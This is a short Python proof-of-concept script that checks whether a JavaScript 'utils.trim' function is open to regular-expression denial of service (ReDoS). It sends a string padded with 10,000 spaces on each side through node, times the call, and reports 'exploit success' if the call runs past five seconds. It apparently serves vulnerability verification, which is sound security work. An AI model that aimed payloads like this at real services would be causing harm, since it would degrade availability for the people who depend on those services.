import subprocess
import time

def test_trim_exploit():
    # Constructing a string that is known to cause issues with certain regex operations
    exploit_string = " " * 10000 + "test" + " " * 10000

    # Start time
    start_time = time.time()

    # Running the JavaScript code using node
    process = subprocess.Popen(['node', '-e', f"""
const utils = require('./lib/utils');
console.log(utils.trim('{exploit_string}'));
    """], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    stdout, stderr = process.communicate()

    # End time
    end_time = time.time()

    # Calculate the duration
    duration = end_time - start_time

    # If the operation takes more than 5 seconds, consider the exploit successful
    if duration > 5:
        print('The ACI exploit success!!!')
    else:
        print('The ACI exploit failed!!!')

if __name__ == "__main__":
    test_trim_exploit()
